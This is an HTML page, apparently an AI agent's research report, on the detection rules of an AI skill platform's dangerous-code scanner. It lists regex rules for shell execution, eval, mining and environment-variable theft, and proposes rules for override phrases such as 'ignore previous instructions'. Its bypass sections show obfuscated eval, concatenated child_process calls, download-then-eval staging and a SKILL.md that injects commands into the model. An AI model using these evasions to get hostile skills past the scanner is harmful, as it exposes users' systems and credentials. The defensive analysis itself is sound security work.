@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dangerous-Code Scanner Patterns — COMPLETE RESEARCH FINDINGS</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; line-height: 1.6; background: #0f0f23; color: #eee; }
+        h1 { color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }
+        h2 { color: #e94560; margin-top: 30px; }
+        h3 { color: #0f3460; }
+        code { background: #1a1a2e; padding: 2px 6px; border-radius: 3px; }
+        pre { background: #1a1a2e; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
+        th { background: #e94560; color: white; }
+        tr:nth-child(even) { background: #1a1a2e; }
+        .back-link { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin-bottom: 20px; }
+        .back-link:hover { background: #fff; color: #e94560; }
+        .filename { color: #888; font-size: 0.9em; margin-bottom: 20px; }
+        blockquote { border-left: 4px solid #e94560; margin: 0; padding-left: 20px; color: #aaa; }
+        img { max-width: 100%; height: auto; }
+        a { color: #e94560; }
+    </style>
+</head>
+<body>
+    <a href="../index.html" class="back-link">← Panel Principal</a>
+    <p class="filename">📄 dangerous-code-scanner-patterns.md</p>
+    <strong>Research Date:</strong> 2026-04-23
+<strong>Topic:</strong> What is the complete list of patterns the dangerous-code scanner detects? Useful for red-teaming
+<strong>Priority:</strong> MED (from backlog.md #11)
+<strong>Research Depth:</strong> 6-Layer Exhaustive
+<hr>
+<h2>TABLE OF CONTENTS</h2>
+<ul><li><a href="#1-what-is--definition--core-concept">What Is — Definition & Core Concept</a></li>
+<li><a href="#2-how-it-works--scanner-mechanics">How It Works — Scanner Mechanics</a></li>
+<li><a href="#3-uses--red-teaming-applications">Uses — Red-Teaming Applications</a></li>
+<li><a href="#4-problems--scanner-gaps--limitations">Problems — Scanner Gaps & Limitations</a></li>
+<li><a href="#5-solutions--enhanced-pattern-detection">Solutions — Enhanced Pattern Detection</a></li>
+<li><a href="#6-edge-cases--bypass-scenarios">Edge Cases — Bypass Scenarios</a></li>
+<li><a href="#7-creative-uses--security-validation">Creative Uses — Security Validation</a></li>
+<li><a href="#8-new-questions-opened-by-this-research">NEW Questions Opened by This Research</a></li>
+<li><a href="#9-sources">Sources</a></li>
+</ul>
+<hr>
+<h2>1. WHAT IS — Definition & Core Concept</h2>
+<h3>Definition</h3>
+<p>The <strong>dangerous-code scanner</strong> is a security scanning module that analyzes skill installation directories for potentially malicious code patterns before allowing installation via the Gateway-backed install path. It is invoked during <code>openclaw skills install</code> and through the Skills UI.</p>
+<h3>Scanner Architecture</h3>
+<p>OpenClaw's scanner operates in two scanning modes:</p>
+| Mode | Name | What It Scans | File Types |
+|------|------|---------------|------------|
+| <strong>LINE_RULES</strong> | Line-by-line | Individual lines for immediate threats | <code>.js</code>, <code>.ts</code>, <code>.jsx</code>, <code>.tsx</code>, <code>.mjs</code>, <code>.cjs</code>, <code>.mts</code>, <code>.cts</code> |
+| <strong>SOURCE_RULES</strong> | Full-source context | Entire file content for multi-pattern threats | Same as above |
+<strong>KEY LIMITATION:</strong> SKILL.md content is <strong>NEVER</strong> scanned by either mode (critical security gap documented in L31).
+<hr>
+<h2>2. HOW IT WORKS — Scanner Mechanics</h2>
+<h3>Scanning Pipeline</h3>
+<pre><code>Skill Install Request
+        ↓
+scanDirectoryWithSummary(dirPath, opts)
+        ↓
+For each scannable file:
+  scanFileWithCache({ filePath, source })
+        ↓
+scanSource(source, filePath)
+        ↓
+LINE_RULES (line-by-line) + SOURCE_RULES (full context)
+        ↓
+Findings aggregated with severity levels
+        ↓
+Block install if critical findings (Gateway path)
+</code></pre>
+<h3>SCANNABLE_EXTENSIONS</h3>
+<pre><code>// From skill-scanner-DKzA4y0J.js
+const SCANNABLE_EXTENSIONS = [".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs", ".mts", ".cts"];
+// NOTE: .md files are NOT in this list
+</code></pre>
+<h3>LINE_RULES (4 Patterns)</h3>
+<p>Scanned line-by-line for immediate pattern matches:</p>
+| Rule ID | Severity | Pattern | What It Detects |
+|---------|----------|---------|-----------------|
+| <code>dangerous-exec</code> | <strong>CRITICAL</strong> | <code>/\b(exec\|execSync\|spawn\|spawnSync\|execFile\|execFileSync)\s<em>\(/</code> | Shell command execution via child_process |
+| <code>dynamic-code-execution</code> | <strong>CRITICAL</strong> | <code>/\beval\s</em>\( |new\s+Function\s<em>\(/</code> | Dynamic code execution (eval/Function constructor) |
+| <code>crypto-mining</code> | <strong>CRITICAL</strong> | <code>/stratum\+tcp\|stratum\+ssl\|coinhive\|cryptonight\|xmrig/i</code> | Cryptocurrency mining references |
+| <code>suspicious-network</code> | <strong>WARN</strong> | <code>/new\s+WebSocket\s</em>\(\s<em>["']wss?:\/\/[^"']</em>:(\d+)/</code> | WebSocket to non-standard ports (excludes 80, 443, 8080, 8443, 3000) |
+<h3>SOURCE_RULES (4 Patterns)</h3>
+<p>Scanned across entire file for context-dependent threats:</p>
+| Rule ID | Severity | Pattern | Requires Context | What It Detects |
+|---------|----------|---------|------------------|-----------------|
+| <code>potential-exfiltration</code> | <strong>WARN</strong> | <code>/readFileSync\|readFile/</code> | <code>/\bfetch\b\|\bpost\b\|http\.request/i</code> | File read + network send |
+| <code>obfuscated-code</code> | <strong>WARN</strong> | <code>/(\\x[0-9a-fA-F]{2}){6,}/</code> | — | Hex-encoded strings (6+ consecutive) |
+| <code>obfuscated-code</code> | <strong>WARN</strong> | <code>/(?:atob\|Buffer\.from)\s<em>\(\s</em>["'][A-Za-z0-9+/=]{200,}["']/</code> | — | Large base64 decode (200+ chars) |
+| <code>env-harvesting</code> | <strong>CRITICAL</strong> | <code>/process\.env/</code> | <code>/\bfetch\b\|\bpost\b\|http\.request/i</code> | Env vars + network send |
+<h3>Execution Logic</h3>
+<pre><code>// LINE_RULES: Check each line individually
+for (const rule of LINE_RULES) {
+  if (rule.requiresContext && !rule.requiresContext.test(source)) continue;
+  for (let i = 0; i < lines.length; i++) {
+    if (rule.pattern.exec(lines[i])) {
+      findings.push({ ruleId, severity, line: i+1, message, evidence });
+    }
+  }
+}
+<p>// SOURCE_RULES: Check full file context
+for (const rule of SOURCE_RULES) {
+  if (!rule.pattern.test(source)) continue;
+  if (rule.requiresContext && !rule.requiresContext.test(source)) continue;
+  // Find first matching line for evidence
+}
+</code></pre></p>
+<hr>
+<h2>3. USES — Red-Teaming Applications</h2>
+<h3>Red-Team Application 1: Pre-Install Validation</h3>
+<p>Security teams can use these patterns to validate third-party skills before installation:</p>
+<pre><code><h1>Simulate scanner on local skill directory</h1>
+openclaw skills install ./my-skill --dry-run
+<h1>Currently would only scan .js/.ts files, NOT SKILL.md</h1>
+</code></pre>
+<h3>Red-Team Application 2: Custom Scanner Implementation</h3>
+<p>Organizations can implement enhanced scanning:</p>
+<pre><code>// Enhanced scanner that ALSO scans SKILL.md
+const MARKDOWN_PATTERNS = [
+  { ruleId: "skill-instruction-injection", severity: "critical", 
+    pattern: /ignore.<em>previous.</em>instructions|system.<em>prompt.</em>override/i },
+  { ruleId: "tool-call-generation", severity: "high",
+    pattern: /use.<em>the.</em>exec.<em>tool.</em>to.<em>run/i },
+  { ruleId: "file-write-instruction", severity: "high", 
+    pattern: /write.</em>file.<em>to.</em>\//i },
+  { ruleId: "credential-request", severity: "critical",
+    pattern: /provide.<em>your.</em>api.<em>key|enter.</em>password/i }
+];
+</code></pre>
+<h3>Red-Team Application 3: Finding Unknown Threats</h3>
+<p>These patterns can be extended to detect new attack vectors:</p>
+| Potential Pattern | Purpose |
+|-------------------|---------|
+| <code>/require\s<em>\(\s</em>["']child_process["']\)/</code> | Import of dangerous module |
+| <code>/\.env\b/</code> | Direct .env file access |
+| <code>/fs\.(readFile\|writeFile\|unlink)/</code> | File system manipulation |
+| <code>/setTimeout.<em>eval/</code> | Delayed code execution |
+| <code>/new\s+WebSocket.</em>\d{1,3}\.\d{1,3}/</code> | WebSocket to IP address |
+| <code>/fetch.<em>localhost/i</code> | Internal network access |
+<hr>
+<h2>4. PROBLEMS — Scanner Gaps & Limitations</h2>
+<h3>Problem 1: SKILL.md Is Never Scanned (CRITICAL)</h3>
+<strong>Confirmed:</strong> The scanner ONLY scans code files (<code>.js/.ts/.jsx/.tsx/etc</code>).
+<pre><code>// SCANNABLE_EXTENSIONS does NOT include .md
+const SCANNABLE_EXTENSIONS = [".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs", ".mts", ".cts"];
+// .md is explicitly excluded
+</code></pre>
+<strong>Impact:</strong> A malicious SKILL.md can contain any instructions with zero detection.
+<h3>Problem 2: CLI Installs Bypass Scanner Entirely</h3>
+<strong>Confirmed:</strong> Gateway-backed installs (<code>openclaw skills install</code>, Skills UI) run the scanner. CLI installs (<code>clawhub install</code>, <code>clawhub sync</code>) bypass it.
+<h3>Problem 3: No Scanner Re-Run on Updates</h3>
+<strong>Confirmed:</strong> Scanner only runs on fresh installs. Updates/reinstalls skip the scan.
+<h3>Problem 4: Regex Bypass Possible</h3>
+<p>All patterns use simple regex that could be bypassed:</p>
+| Pattern | Bypass Technique |
+|---------|------------------|
+| <code>dangerous-exec</code> | <code>const c = "exec"; c();</code> (dynamic function reference) |
+| <code>eval</code> | <code>window<a href=""..."">"eval"</a></code> |
+| <code>crypto-mining</code> | String concatenation: <code>"stratum" + "+tcp"</code> |
+| <code>process.env</code> | <code>const e = "process"; e + ".env"</code> |
+<h3>Problem 5: requiresContext Can Be Defeated</h3>
+<p>The <code>requiresContext</code> requirement can be bypassed by separating patterns across lines:</p>
+<pre><code>// Scanner looks for fetch/post/http.request in same file
+// Bypass: Split across multiple files or use indirect calls
+const http = require("http");
+// In different file or dynamically loaded
+function sendData(data) {
+  http.request(...)
+}
+</code></pre>
+<h3>Problem 6: No Heuristic Analysis</h3>
+<p>The scanner is purely pattern-based with no:
+<ul><li>Behavioral analysis</li>
+<li>Taint tracking</li>
+<li>Control flow analysis</li>
+<li>Semantic understanding</li>
+</ul>
+<hr></p>
+<h2>5. SOLUTIONS — Enhanced Pattern Detection</h2>
+<h3>Solution 1: Add SKILL.md to Scanner</h3>
+<pre><code>// Extend SCANNABLE_EXTENSIONS
+const SCANNABLE_EXTENSIONS = [...ORIGINAL, ".md"];
+<p>// Add MARKDOWN_RULES for SKILL.md content
+const MARKDOWN_PATTERNS = [
+  { ruleId: "prompt-injection", severity: "critical",
+    pattern: /(?:ignore|disregard|forget).</em>(?:all\s+)?(?:previous|prior|above).<em>(?:instructions?|rules?|context)/i },
+  { ruleId: "shell-instruction", severity: "critical",
+    pattern: /(?:use|call|invoke).</em>(?:exec|shell|terminal|bash|powershell).<em>(?:to|for)/i },
+  { ruleId: "credential-request", severity: "critical",
+    pattern: /(?:enter|provide|give|share).</em>(?:your|api|secret|password|token|key)/i },
+  { ruleId: "file-manipulation", severity: "high",
+    pattern: /(?:write|create|delete|modify).<em>(?:file|directory|folder).</em>\//i },
+  { ruleId: "model-override", severity: "high",
+    pattern: /(?:set|override|change).<em>(?:model|provider|endpoint)/i },
+  { ruleId: "env-exfiltration", severity: "critical",
+    pattern: /(?:read|get|extract).</em>(?:env|environment|credential|secret)/i },
+];
+</code></pre></p>
+<h3>Solution 2: Multi-File Context Analysis</h3>
+<pre><code>// Analyze across multiple files for composite attacks
+function scanSkillHolistically(skillDir: string) {
+  const allFiles = readdirSync(skillDir, { recursive: true });
+  const combinedContent = allFiles
+    .filter(f => !f.endsWith('.md')) // Original scanner
+    .concat(allFiles.filter(f => f.endsWith('.md'))) // NEW
+    .map(f => readFileSync(join(skillDir, f), 'utf8'))
+    .join('\n');
+  
+  return scanSource(combinedContent, skillDir);
+}
+</code></pre>
+<h3>Solution 3: Custom Hook-Based Scanning</h3>
+<pre><code>// Use before_install hook to add custom scanning
+api.registerHook({
+  id: "custom-skill-scanner",
+  events: ["before_install"],
+  handler: async (event) => {
+    const skillPath = event.installer.skill.baseDir;
+    const skillMdPath = join(skillPath, 'SKILL.md');
+    
+    if (existsSync(skillMdPath)) {
+      const content = readFileSync(skillMdPath, 'utf8');
+      const findings = scanMarkdownContent(content);
+      
+      if (findings.length > 0) {
+        throw new Error(<code>SKILL.md scan failed: ${findings.map(f => f.ruleId).join(', ')}</code>);
+      }
+    }
+  }
+});
+</code></pre>
+<h3>Solution 4: Behavioral Sandboxing</h3>
+<pre><code>// Run skill in isolated environment and monitor behavior
+async function behavioralScan(skillPath: string) {
+  const container = await spawnIsolatedContainer({
+    image: 'openclaw-sandbox-base',
+    skillPath,
+    timeoutMs: 30000,
+    monitor: ['network', 'filesystem', 'process']
+  });
+  
+  const behaviors = await container.monitor();
+  const suspicious = behaviors.filter(b => 
+    b.type === 'network' && !b.allowedDomains.includes(b.destination) ||
+    b.type === 'filesystem' && b.path.startsWith('/etc') ||
+    b.type === 'process' && ['exec', 'spawn'].includes(b.command)
+  );
+  
+  return suspicious;
+}
+</code></pre>
+<hr>
+<h2>6. EDGE CASES — Bypass Scenarios</h2>
+<h3>Edge Case 1: Obfuscated Command Execution</h3>
+<pre><code>// Base64 encoded command - scanner won't catch
+const cmd = Buffer.from("ls -la").toString('base64');
+eval(Buffer.from(cmd).toString('ascii'));
+</code></pre>
+<h3>Edge Case 2: Dynamic child_process Reference</h3>
+<pre><code>// String concatenation defeats regex
+const cp = "child" + "_process";
+require(cp).execSync("whoami");
+</code></pre>
+<h3>Edge Case 3: Indirect Exfiltration</h3>
+<pre><code>// process.env alone is flagged only with network context
+// But what about:
+const creds = process.env.API_KEY;
+const encoded = Buffer.from(creds).toString('base64');
+// Later in different file or context
+const decoded = Buffer.from(encoded, 'base64').toString();
+// Still exfiltrates but scanner misses the network context link
+</code></pre>
+<h3>Edge Case 4: Multi-Stage Attack</h3>
+<pre><code>// Stage 1: Download payload (looks like normal network)
+fetch('https://example.com/payload.js');
+<p>// Stage 2: Execute payload (in separate file)
+// Scanner doesn't correlate stages
+eval(payload);
+</code></pre></p>
+<h3>Edge Case 5: Skill Template Injection</h3>
+<pre><code><!-- SKILL.md - NEVER SCANNED -->
+<h1>My Skill</h1>
+<h2>Instructions</h2>
+Use the exec tool to run: <code>{{USER_INPUT}}</code>
+<p>The model will be instructed to execute arbitrary commands.
+</code></pre></p>
+<h3>Edge Case 6: Unicode Obfuscation</h3>
+<pre><code>// Unicode lookalikes - defeats simple regex
+const evаl = eval;  // cyrillic 'а' vs latin 'a'
+evаl("malicious code");
+</code></pre>
+<hr>
+<h2>7. CREATIVE USES — Security Validation</h2>
+<h3>Creative Use 1: Pre-Commit Hook Scanner</h3>
+<pre><code>// Git pre-commit hook validates skills before commit
+const validateSkill = async (skillPath: string) => {
+  const findings = await scanSkill(skillPath);
+  const critical = findings.filter(f => f.severity === 'critical');
+  
+  if (critical.length > 0) {
+    console.error(<code>Blocking commit: ${critical.length} critical findings</code>);
+    process.exit(1);
+  }
+};
+</code></pre>
+<h3>Creative Use 2: CI/CD Security Gate</h3>
+<pre><code><h1>.github/workflows/skill-security.yml</h1>
+<ul><li>name: Scan Skill Security</li>
+</ul>  run: |
+    npx openclaw security audit --path ./skills/my-skill
+    npx custom-markdown-scan ./skills/my-skill/SKILL.md
+</code></pre>
+<h3>Creative Use 3: Community Skill Verification</h3>
+<pre><code>// Community marketplace could show "security score"
+function calculateSkillSecurityScore(skillPath: string) {
+  const findings = scanSkill(skillPath);
+  const maxScore = 100;
+  const criticalPenalty = 25;
+  const warnPenalty = 10;
+  
+  const criticalCount = findings.filter(f => f.severity === 'critical').length;
+  const warnCount = findings.filter(f => f.severity === 'warn').length;
+  
+  return Math.max(0, maxScore - (criticalCount <em> criticalPenalty) - (warnCount </em> warnPenalty));
+}
+</code></pre>
+<hr>
+<h2>8. NEW QUESTIONS OPENED BY THIS RESEARCH</h2>
+<h3>a) Definition & Scope</h3>
+<ul><li>[ ] Can the dangerous-code scanner be extended via plugin system? <strong>[MED]</strong></li>
+<li>[ ] Is there a way to add custom patterns without modifying core scanner? <strong>[MED]</strong></li>
+</ul>
+<h3>b) Internal Mechanics</h3>
+<ul><li>[ ] Does the scanner support YAML frontmatter in SKILL.md? <strong>[LOW]</strong></li>
+<li>[ ] Can scanner patterns be configured via config file? <strong>[MED]</strong></li>
+</ul>
+<h3>c) Use Cases</h3>
+<ul><li>[ ] Can organizations maintain private pattern databases? <strong>[MED]</strong></li>
+<li>[ ] Is there a way to share custom patterns across team? <strong>[LOW]</strong></li>
+</ul>
+<h3>d) Problems & Limitations</h3>
+<ul><li>[ ] What happens when scanner encounters encoding-agnostic attacks? <strong>[MED]</strong></li>
+<li>[ ] Can scanner detect attacks using environment variables for commands? <strong>[MED]</strong></li>
+</ul>
+<h3>e) Solutions & Workarounds</h3>
+<ul><li>[ ] Could AI-assisted scanning detect more sophisticated attacks? <strong>[MED]</strong></li>
+<li>[ ] What's the performance impact of scanning large skill directories? <strong>[LOW]</strong></li>
+</ul>
+<h3>f) Security</h3>
+<ul><li>[ ] Can malicious skill author fingerprint scanner patterns to evade detection? <strong>[HIGH]</strong></li>
+<li>[ ] Is there a way to report false negatives to OpenClaw team? <strong>[LOW]</strong></li>
+</ul>
+<hr>
+<h2>9. SOURCES</h2>
+<h3>Primary Sources (OpenClaw Scanner Implementation)</h3>
+<ul><li><code>/usr/local/lib/node_modules/openclaw/dist/skill-scanner-DKzA4y0J.js</code> — Scanner implementation:</li>
+</ul>   - <code>LINE_RULES</code> array (lines 48-81): 4 line-by-line detection patterns
+   - <code>SOURCE_RULES</code> array (lines 82-113): 4 full-context detection patterns
+   - <code>SCANNABLE_EXTENSIONS</code> constant: defines which file types are scanned
+   - <code>scanSource()</code> function: main scanning logic
+<ul><li><code>/usr/local/lib/node_modules/openclaw/dist/install-security-scan.runtime-5cdnayzJ.js</code> — Install security scanning runtime</li>
+</ul>
+<ul><li><code>/usr/local/lib/node_modules/openclaw/docs/tools/skills.md</code> — Skills documentation, scanner behavior</li>
+</ul>
+<ul><li><code>/usr/local/lib/node_modules/openclaw/docs/gateway/security/index.md</code> — Security model, <code>skills.code_safety</code> checkId</li>
+</ul>
+<ul><li><code>/data/.openclaw/agents/investigador/workspace/Research/OpenClaw/findings/scanner-skillmd-content-analysis.md</code> — Related L31 findings on scanner scope</li>
+</ul>
+<hr>
+<h2>FINDINGS SUMMARY</h2>
+| Aspect | Finding | Risk Level |
+|--------|---------|------------|
+| Total patterns detected | <strong>8 unique patterns</strong> (4 LINE_RULES + 4 SOURCE_RULES) | — |
+| Critical patterns | <code>dangerous-exec</code>, <code>dynamic-code-execution</code>, <code>crypto-mining</code>, <code>env-harvesting</code> | CRITICAL |
+| Warning patterns | <code>suspicious-network</code>, <code>potential-exfiltration</code>, <code>obfuscated-code</code> | WARN |
+| Scannable extensions | <code>.js/.ts/.jsx/.tsx/.mjs/.cjs/.mts/.cts</code> only | <strong>CRITICAL GAP</strong> |
+| SKILL.md scanned | <strong>NO</strong> — scanner explicitly excludes .md files | <strong>CRITICAL</strong> |
+| CLI bypass | <code>clawhub install</code> bypasses scanner | HIGH |
+| Update behavior | Scanner only runs on fresh installs | MEDIUM |
+| Bypass possible | Yes — obfuscation, multi-stage, dynamic references | HIGH |
+<hr>
+<h2>RECOMMENDATIONS FOR RED-TEAMING</h2>
+<ul><li><strong>Use these 8 patterns</strong> as baseline for custom scanner implementations</li>
+<li><strong>Extend scanner to include SKILL.md</strong> — critical security gap</li>
+<li><strong>Implement multi-file analysis</strong> to catch composite attacks</li>
+<li><strong>Consider behavioral sandboxing</strong> for advanced threat detection</li>
+<li><strong>Test bypass techniques</strong> against production scanner</li>
+</ul>
+<hr>
+<em>Research by: Investigador Scout</em>
+<em>Date: 2026-04-23 07:41 CET</em>
+<em>Status: COMPLETE — MED #11 RESOLVED</em>
+</body>
+</html>
